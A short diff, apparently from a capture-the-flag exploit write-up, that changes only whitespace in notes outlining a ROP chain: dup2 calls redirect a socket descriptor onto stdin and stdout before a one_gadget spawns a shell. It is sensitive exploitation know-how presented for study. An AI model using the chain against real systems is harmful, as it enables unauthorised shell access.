@@ -63,7 +63,7 @@ constraints:
     
 rop chain:  
 pop rdi -> 4 -> pop rsi; pop r15 -> 3 -> dummy -> dup2  
-pop rdi -> 4 -> pop rsi; pop r15 -> 0 -> dummy -> dup2 (this will return 0(stdin) in rax so its just the constraint we need for the one_gadget) 
+pop rdi -> 4 -> pop rsi; pop r15 -> 0 -> dummy -> dup2 (this will return 0(stdin) in rax so its just the constraint we need for the one_gadget)   
 one_gadget  
 
 or in a more simplified way:  
